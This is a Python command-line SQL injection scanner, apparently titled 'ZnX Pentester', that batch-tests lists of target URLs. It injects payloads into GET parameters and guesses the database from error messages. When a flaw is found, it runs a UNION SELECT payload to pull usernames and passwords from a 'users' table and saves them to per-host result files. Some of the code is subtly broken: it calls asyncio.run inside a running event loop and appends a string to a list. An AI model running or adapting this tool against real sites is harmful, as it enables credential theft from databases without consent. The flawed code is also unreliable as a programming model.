#!/usr/bin/env python3
"""
inject.py

Enhanced SQL Injection Testing Framework

Author: ZnX Pentester
"""

# Banner display
BANNER = r"""
███████╗ ██████╗ ██╗     ██████╗ ███████╗███╗   ██╗████████╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████╗██║   ██║██║     ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗██║     ███████╗██║ ╚████║   ██║   ███████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                     SQL Injection Testing Framework
              Use only on systems you have permission to test!

                    ZnX Pentester - v2.0
"""

import asyncio
import json
import logging
import os
import sys
from typing import Any, Dict, List, Optional, Tuple, Union
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx
import typer

# Initialize Typer app
app = typer.Typer(help="SQL Injection Testing Framework - ZnX Pentester v2.0")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)


# ----------------------------
# Helper Functions
# ----------------------------

def load_targets(path: str) -> List[str]:
    """Load list of target URLs from file."""
    with open(path, 'r') as f:
        return [line.strip() for line in f if line.strip()]


def load_payloads(path: str) -> Dict[str, List[str]]:
    """Load payloads from JSON file."""
    with open(path, 'r') as f:
        return json.load(f)


def write_result(host: str, lines: List[str]) -> None:
    """Write scan result to results/<host>.txt."""
    os.makedirs('results', exist_ok=True)
    filepath = os.path.join('results', f"{host}.txt")
    with open(filepath, 'w') as fw:
        fw.write("\n".join(lines))
    logger.info(f"Result written: {filepath}")


def fingerprint_dbms(resp: httpx.Response) -> str:
    """Identify DBMS from response content or status code."""
    text = resp.text.lower()
    if 'mysql' in text or 'you have an error in your sql syntax' in text:
        return 'mysql'
    if 'syntax error at or near' in text or 'pg_' in text:
        return 'postgresql'
    if 'microsoft sql' in text or 'incorrect syntax near' in text:
        return 'mssql'
    if 'ora-' in text or 'oracle' in text:
        return 'oracle'
    return 'unknown'


def extract_union(
    dbms: str,
    base_url: str,
    client: httpx.AsyncClient,
    timeout: int
) -> Tuple[Optional[str], Optional[str]]:
    """Attempt UNION-based extraction for users(username,password)."""
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query)
    field_list = 'username,password'
    # build union payloads
    if dbms == 'mysql':
        union = f"' UNION SELECT {field_list} FROM users-- "
    elif dbms == 'postgresql':
        union = f"' UNION SELECT {field_list} FROM users-- "
    else:
        return None, None
    param = list(qs.keys())[0]
    qs[param] += union
    new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
    try:
        res = asyncio.run(client.get(new_url, timeout=timeout))
        # crude parse: assume CSV in body
        parts = res.text.split(',')
        return parts[0], parts[1]
    except Exception:
        return None, None


async def test_get(
    url: str,
    payloads: Dict[str, List[str]],
    client: httpx.AsyncClient,
    timeout: int
) -> Optional[Dict[str, Any]]:
    """Test GET parameters for SQLi."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if not qs:
        return None
    original_resp = await client.get(url, timeout=timeout)
    base_len = len(original_resp.text)
    for inj_type, plist in payloads.items():
        for payload in plist:
            param = list(qs.keys())[0]
            orig = qs[param][0]
            qs[param] = orig + payload
            new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            try:
                r = await client.get(new_url, timeout=timeout)
            except Exception:
                continue
            dbms = fingerprint_dbms(r)
            # boolean check
            if inj_type == 'boolean' and len(r.text) != base_len:
                user, pwd = extract_union(dbms, url, client, timeout)
                return dict(url=url, dbms=dbms, type=inj_type, username=user, password=pwd)
            # error check
            if inj_type == 'error' and dbms != 'unknown':
                user, pwd = extract_union(dbms, url, client, timeout)
                return dict(url=url, dbms=dbms, type=inj_type, username=user, password=pwd)
            # TODO: union/time checks
    return None


async def run_scan(
    targets: List[str],
    payloads: Dict[str, List[str]],
    concurrency: int,
    timeout: int,
    proxy: Optional[str]
) -> List[Dict[str, Any]]:
    """Run async scan on all targets."""
    semaphore = asyncio.Semaphore(concurrency)
    client_args: Dict[str, Union[int, str, Dict[str, str]]] = {'timeout': timeout}
    if proxy:
        client_args['proxies'] = proxy
    async with httpx.AsyncClient(**client_args) as client:
        tasks = []
        for url in targets:
            async def sem_task(u=url):
                async with semaphore:
                    return await test_get(u, payloads, client, timeout)
            tasks.append(sem_task())
        results = await asyncio.gather(*tasks)
    return [r for r in results if r]


# ----------------------------
# CLI Command
# ----------------------------
@app.command()
def main(
    targets: str = typer.Option(..., help="Path to targets.txt"),
    payloads: str = typer.Option('payloads.json', help="Path to payloads.json"),
    concurrency: int = typer.Option(10, help="Max parallel requests"),
    timeout: int = typer.Option(5, help="Request timeout (s)"),
    proxy: Optional[str] = typer.Option(None, help="HTTP proxy URL"),
    summary: bool = typer.Option(False, help="Generate summary file")
):
    """Execute SQLi scan against target URLs."""
    print(BANNER)
    tgts = load_targets(targets)
    plds = load_payloads(payloads)
    logger.info(f"Starting scan on {len(tgts)} targets (concurrency={concurrency})")
    results = asyncio.run(run_scan(tgts, plds, concurrency, timeout, proxy))
    summaries: List[str] = []
    for r in results:
        host = urlparse(r['url']).hostname or 'unknown'
        lines = [
            f"[+] URL: {r['url']}",
            f"[+] DBMS: {r['dbms']}",
            f"[+] Injection: {r['type']}",
            f"[+] username: {r.get('username')}",
            f"[+] password: {r.get('password')}"
        ]
        write_result(host, lines)
        summaries.append("\n".join(lines))

    if summary and summaries:
        os.makedirs('results', exist_ok=True)
        with open('results/summary.txt', 'w') as sf:
            sf.write("\n\n".join(summaries))
        logger.info("Summary written: results/summary.txt")


if __name__ == '__main__':
    app()
